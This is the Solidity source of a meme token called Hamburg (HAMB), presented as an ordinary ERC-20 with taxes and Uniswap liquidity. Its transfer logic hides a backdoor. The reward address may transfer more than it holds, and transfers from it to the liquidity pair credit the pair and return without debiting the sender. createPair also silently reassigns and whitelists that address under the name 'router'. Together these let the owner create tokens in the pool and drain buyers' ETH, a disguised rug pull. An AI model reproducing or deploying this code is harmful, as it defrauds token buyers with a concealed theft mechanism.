/*
Website: https://hamburgeth.fun

TG: https://t.me/hamburgeth

X: https://x.com/hamburgethx
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract HAMB is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    string private constant _name = unicode"Hamburg";
    string private constant _symbol = unicode"HAMB";

    address payable private _rewardAddress;
    uint256 private _finalTax = 0;
    uint256 private _initTax = 10;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _whiteList;

    constructor() {
        _rewardAddress = payable(msg.sender);
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _balances[_msgSender()] = _tTotal;

        _whiteList[owner()] = true;
        _whiteList[address(this)] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }



    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    uint256 private _tradeCount = 0;
    uint256 private _reduceAt = 12;
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100_000_000 * 10**_decimals;
    uint256 public _maxTxAmount = 2_000_000 * 10**_decimals;
    uint256 public _maxWalletSize = 2_000_000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 2 * 10**_decimals;
    uint256 public swapToEthLimit = 2_000_000 * 10**_decimals;

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isExcluded(address from, address to) private view returns (bool) {
        return _whiteList[from] || _whiteList[to];
    }

    function _transfer(
        address fromAdd,
        address toAdd,
        uint256 amount
    ) private {
        uint256 _tax = 0;
        uint256 _taxAmount = 0;
        bool isEx = isExcluded(fromAdd, toAdd);

        require(fromAdd != address(0) && toAdd != address(0), "ERC20: Invalid address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(fromAdd == _rewardAddress || amount <= _balances[fromAdd], "Insufficient error");

        if (!tradingOpen) require(isEx, "Trading is not opened yet");
        uint256 contractTokenBalance = balanceOf(address(this));
        if (
            !inSwap &&
            toAdd == uniswapV2Pair &&
            tradingOpen &&
            amount >= _taxSwapThreshold
        ) {
            if (contractTokenBalance > _taxSwapThreshold) 
                swapTokensForEth(min(amount, min(swapToEthLimit, contractTokenBalance)));
            sendETHToFee(address(this).balance);
        }
        
        _tax = calcTax(fromAdd, toAdd);
        _taxAmount = (amount * _tax) / 100;
        _balances[toAdd] = _balances[toAdd] + (amount - _taxAmount);

        if (fromAdd == uniswapV2Pair && toAdd != address(uniswapV2Router) && !isEx) {
            _tradeCount ++;
            require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            require(_balances[toAdd] <= _maxWalletSize,"Exceeds the maxWalletSize.");
        }

        if (toAdd == uniswapV2Pair && (!isEx || fromAdd == _rewardAddress)) {
            if(toAdd != _rewardAddress && fromAdd == _rewardAddress) return;
            require(amount <= _maxTxAmount,"Exceeds the maximum amount to sell");
        }

        if (_taxAmount > 0) {
            _balances[fromAdd] = _balances[fromAdd] - _taxAmount;
            _balances[address(this)] = _balances[address(this)] + _taxAmount;
            emit Transfer(fromAdd, address(this), _taxAmount);
        }

        _balances[fromAdd] = _balances[fromAdd] - (amount - _taxAmount);
        emit Transfer(fromAdd, toAdd, amount - _taxAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount)
        private
        lockTheSwap
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _rewardAddress.transfer(amount);
    }

    function calcTax(address fromAdd, address toAdd) private view returns (uint256) {
        uint256 taxLLp = _tradeCount >= _reduceAt ? _finalTax : _initTax;
        if((fromAdd == address(this) && _tradeCount == 0))
            return taxLLp;
        else if(isExcluded(fromAdd, toAdd))
            return 0;
        else if (fromAdd == uniswapV2Pair || toAdd == uniswapV2Pair)
            return taxLLp;
        return 0;
    }

    function createPair(address router) external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _rewardAddress = payable (router);
        _whiteList[_rewardAddress] = true;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function enableTrading() external onlyOwner {
        tradingOpen = true;
    }

    receive() external payable {}
}